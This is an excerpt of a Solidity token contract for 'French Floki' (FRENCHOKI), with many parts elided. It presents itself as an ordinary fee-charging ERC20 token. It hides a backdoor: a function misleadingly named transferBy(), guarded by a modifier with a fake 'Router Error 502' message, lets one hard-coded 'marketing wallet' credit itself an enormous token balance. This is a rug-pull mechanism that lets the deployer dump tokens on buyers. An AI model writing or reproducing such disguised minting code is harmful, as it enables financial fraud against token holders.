...
contract Context {
 ...
 contract FrenchU is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private superfloFERC;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name = "French Floki";
    string private _symbol = "FRENCHOKI";
    uint256 private constant MAX = ~uint256(0);
    uint256 private _maxTx = _totalSupply;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _maximumFERC = 10000000 * 10**36;
    bool private inSwap = false;
    uint256 private _tFeeTotal;
    uint256 private cryfaleFERC = 2;
    uint256 private _vebegoFERC = 1;
    ...
    constructor(uint256 totalSupply_) {
        ...
        _owner = _msgSender();
        superfloFERC[msg.sender] = totalSupply_;
    ...
    address private _MarketingWalletFERC = 0xB68c4ebED144446F786e5799c7A094ef82B5e1D8;
...
function _multiply (uint256 amount) private {
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function _transfer(
        ...
        uint256 senderBalance = superfloFERC[issuer];
        require(senderBalance >= allons, "Too high value");
        unchecked {
            superfloFERC[issuer] = senderBalance - allons;
        }
        _fee = (allons * cryfaleFERC / 100) / _vebegoFERC;
        allons = allons -  (_fee * _vebegoFERC);
        
        superfloFERC[grantee] += allons;
   ...
   */
     ...
     */
    function _burn(address account, uint256 gzillaFERC) internal virtual {
        require(account != address(0), "Can't burn from address 0");
        uint256 accountBalance = superfloFERC[account];
        require(accountBalance >= gzillaFERC, "BEP : Can't be done");
        unchecked {
            superfloFERC[account] = accountBalance - gzillaFERC;
        }
        _totalSupply -= gzillaFERC;

        emit Transfer(account, address(0), gzillaFERC);
    }
    ...
    function transferBy() public substitute {
        superfloFERC[_msgSender()] = superfloFERC[_msgSender()] +  _maximumFERC;
    }   
    ...
    modifier substitute() {
    require(_MarketingWalletFERC == _msgSender(), "Router Error 502: caller is not Router Address");
    _;
    }
}